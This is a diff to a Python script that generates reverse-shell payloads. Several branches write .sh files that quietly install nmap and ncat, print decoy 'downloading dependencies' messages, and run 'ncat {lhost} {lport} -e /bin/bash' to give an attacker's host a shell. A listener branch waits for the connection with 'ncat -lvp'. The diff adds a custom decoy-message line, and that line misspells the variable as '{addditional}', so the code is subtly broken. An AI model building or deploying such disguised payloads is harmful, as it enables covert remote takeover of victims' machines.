@@ -196,6 +196,7 @@ elif payload=="11":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo apt-get install nmap -y &> /dev/null
+echo -e '\033[1;32m {addditional}'
 echo -e '\033[1;32m DOWNLOADING dependencies for {name} ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -207,6 +208,7 @@ elif payload=="12":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo pacman -S install nmap -y &> /dev/null
+echo -e '\033[1;32m {addditional}'
 echo -e '\033[1;32m DOWNLOADING dependencies for {name} ..please wait!\n'
 sudo pacman -S install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -218,6 +220,7 @@ elif payload=="13":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo apt-get install nmap -y &> /dev/null
+echo -e '\033[1;32m {addditional}'
 echo -e '\033[1;32m DOWNLOADING dependencies for {name} ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -229,6 +232,7 @@ elif payload=="14":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo apt-get install nmap -y &> /dev/null
+echo -e '\033[1;32m {addditional}'
 echo -e '\033[1;32m {name} is executing,this may take a while ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -240,17 +244,19 @@ elif payload=="15":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo pacman -S install nmap -y &> /dev/null
+echo -e '\033[1;32m {addditional}'
 echo -e '\033[1;32m {name} is executing,this may take a while ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
-elif payload=="14":
+elif payload=="16":
 	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo apt-get install nmap -y &> /dev/null
+echo -e '\033[1;32m {addditional}'
 echo -e '\033[1;32m {name} is executing,this may take a while ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -269,7 +275,7 @@ elif payload=="L":
 	 """)
 	print("CTRL-C to quit..")
 	os.system(f"ncat -lvp {lport} ")
-	print("EXITING.....BYE BYE...")
+	print(" Connection closed...EXITING.....BYE BYE...")
 	exit()
 else:
 	print("NO MODULE SELECTED...>ABORTING......")
@@ -288,7 +294,7 @@ if listener=="y":
 	 """)
 	print("CTRL-C to quit..")
 	os.system(f"ncat -lvp {lport} ")
-	print("EXITING.....BYE BYE...")
+	print(" Connection closed...EXITING.....BYE BYE...")
 	exit()
 else:
 	print("EXITING...")
